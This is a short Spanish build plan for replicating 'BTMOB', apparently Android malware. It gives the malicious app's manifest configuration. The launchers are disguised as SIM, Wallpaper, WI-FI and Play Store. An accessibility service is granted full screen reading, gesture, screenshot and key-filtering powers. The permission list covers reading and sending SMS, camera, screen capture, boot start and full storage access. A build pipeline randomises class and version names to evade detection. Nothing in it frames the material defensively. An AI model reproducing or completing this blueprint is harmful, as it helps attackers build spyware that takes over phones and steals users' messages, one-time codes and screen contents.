# PLANO KRYPTOS - replicacion de build y arranque BTMOB
Fuente: APK plantilla mantle.tropical.teacher, minSdk 14, targetSdk 34.
application: label=@string icon=@drawable/my_app_logo largeHeap=true supportsRtl=true
extractNativeLibs=true usesCleartextTraffic=true networkSecurityConfig=@xml/network_security
appComponentFactory=androidx.core.app.CoreComponentFactory requestLegacyExternalStorage=true
uses-library org.apache.http.legacy required=false
provider androidx.core.content.FileProvider + @xml/pfs1
4 lanzadoras con label e icono propios: SIM, Wallpaper, WI-FI, Play Store
3 actividades exportadas de atajo: Lock, Alerts, Update
servicio accesibilidad: exported=0 foregroundServiceType=0x400 BIND_ACCESSIBILITY_SERVICE meta-data @xml/accesibilidad
servicio dream: BIND_DREAM_SERVICE meta-data @xml/screensaver
receptores exportados: AppAlarm y otros
accesibilidad: eventTypes=0xffffffff feedback=0xffffffff flags=0x1f notificationTimeout=0
canRetrieveWindowContent canPerformGestures canTakeScreenshot canRequestTouchExplorationMode
canRequestEnhancedWebAccessibility canRequestFilterKeyEvents isAccessibilityTool = true
screensaver: dream settingsActivity
network_security: base-config cleartextTrafficPermitted=true
dapm: device-admin uses-policies vacio
pfs1: external-path external_files "."
permisos en este orden: FOREGROUND_SERVICE POST_NOTIFICATIONS FGS_MEDIA_PROJECTION FGS_DATA_SYNC
RECEIVE_BOOT_COMPLETED INTERNET ACCESS_NETWORK_STATE SET_ALARM WAKE_LOCK MANAGE_EXTERNAL_STORAGE
WRITE_EXTERNAL_STORAGE READ_EXTERNAL_STORAGE CAMERA FLASHLIGHT SEND_SMS READ_PHONE_NUMBERS READ_SMS
permisos propios: PROCESS_PUSH_MSG PUSH_PROVIDER PUSH_WRITE_PROVIDER DYNAMIC_RECEIVER_NOT_EXPORTED TDOS_DIAGNOSE_BROADCAST
BUILD: plantilla APK + 7z + aapt + firma en memoria. versionName aleatorio con versionCode derivado. Nombres de clase aleatorizados.
PENDIENTE: settingsActivity del dream apunta a com.icontrol.protector/.tofront, corregir.
